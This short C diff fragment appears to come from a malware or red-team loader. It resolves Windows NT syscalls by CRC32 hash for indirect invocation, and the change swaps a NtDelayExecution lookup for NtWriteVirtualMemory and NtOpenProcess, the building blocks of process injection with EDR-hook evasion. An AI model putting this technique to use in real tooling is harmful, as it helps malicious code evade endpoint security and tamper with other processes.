@@ -36,12 +36,14 @@ BOOL InitIndirectSyscalls(OUT PNT_API Nt)
         return FALSE;
     }
 
-    if (!FetchNtSyscall(NtDelayExecution_CRC32, &Nt->NtDelayExecution)) {
-#ifdef DEBUG
-        PRINT("[!] Failed To Initialize \"NtDelayExecution\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
-#endif
+    if (!FetchNtSyscall(NtWriteVirtualMemory_CRC32, &Nt->NtWriteVirtualMemory)) {
         return FALSE;
     }
+
+    if (!FetchNtSyscall(NtOpenProcess_CRC32, &Nt->NtOpenProcess)) {
+        return FALSE;
+    }
+
 
 #ifdef DEBUG
     PRINT("[V] NtOpenSection [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtOpenSection.dwSSn, Nt->NtOpenSection.pSyscallInstAddress);
